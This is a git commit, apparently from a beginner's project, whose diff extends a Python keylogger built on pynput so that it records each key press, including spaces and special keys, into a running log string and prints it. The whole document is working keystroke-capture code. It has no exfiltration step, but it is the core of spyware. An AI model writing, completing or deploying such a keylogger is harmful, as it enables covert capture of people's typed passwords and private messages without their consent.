a49fb386bcba23838643ad8da81eca1d46185970
Nicole B <48190415+nicbatten@users.noreply.github.com>
2019-09-27 16:37:45 -0400

    Added new functionality

--- keylogger.py
+++ keylogger.py
@@ -2,8 +2,18 @@
 
 import pynput.keyboard
 
+log = ""
+
 def process_key_press(key):
-    print(key)
+    global log
+    try:
+        log = log + str(key.char)
+    except AttributeError:
+        if key == key.space:
+            log = log + " "
+        else:
+            log = log + " " + str(key) + " "
+    print(log)
 
 keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
 with keyboard_listener:
